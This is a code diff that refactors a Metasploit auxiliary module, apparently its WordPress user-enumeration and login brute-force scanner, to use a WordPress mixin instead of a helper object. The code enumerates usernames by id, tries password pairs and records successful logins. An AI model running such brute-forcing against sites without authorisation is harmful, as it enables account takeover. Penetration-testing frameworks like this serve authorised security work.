@@ -8,6 +8,7 @@
 require 'http/wordpress'
 
 class Metasploit3 < Msf::Auxiliary
+	include HTTP::Wordpress
 	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::AuthBrute
 	include Msf::Auxiliary::Report
@@ -47,9 +48,8 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
-		@wordpress = HTTP::Wordpress.new(self)
 
-		unless @wordpress.wordpress_and_online?
+		unless wordpress_and_online?
 			fail_with(Failure::NoTarget, "#{target_uri} does not seeem to be Wordpress site")
 		end
 
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
 				do_enum(user)
 			}
 
-			unless (@users_found.empty?)
+			unless @users_found.empty?
 				print_good("#{target_uri} - WordPress Enumeration - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
 			end
 		end
@@ -105,7 +105,7 @@ class Metasploit3 < Msf::Auxiliary
 	def do_enum(user=nil)
 		print_status("#{target_uri} - WordPress Enumeration - Checking Username:'#{user}'")
 
-		exists = @wordpress.wordpress_user_exists?(user)
+		exists = wordpress_user_exists?(user)
 		if exists
 			print_good("#{target_uri} - WordPress Enumeration- Username: '#{user}' - is VALID")
 			report_auth_info(
@@ -128,7 +128,7 @@ class Metasploit3 < Msf::Auxiliary
 	def do_login(user=nil, pass=nil)
 		vprint_status("#{target_uri} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'")
 
-		cookie = @wordpress.wordpress_login(user, pass)
+		cookie = wordpress_login(user, pass)
 
 		if cookie
 			print_good("#{target_uri} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'")
@@ -151,7 +151,7 @@ class Metasploit3 < Msf::Auxiliary
 	def enum_usernames
 		usernames = []
 		for i in datastore['RANGE_START']..datastore['RANGE_END']
-			username = @wordpress.wordpress_userid_exists?(i)
+			username = wordpress_userid_exists?(i)
 			if username
 				print_good "#{target_uri} - Found user '#{username}' with id #{i.to_s}"
 				usernames << username
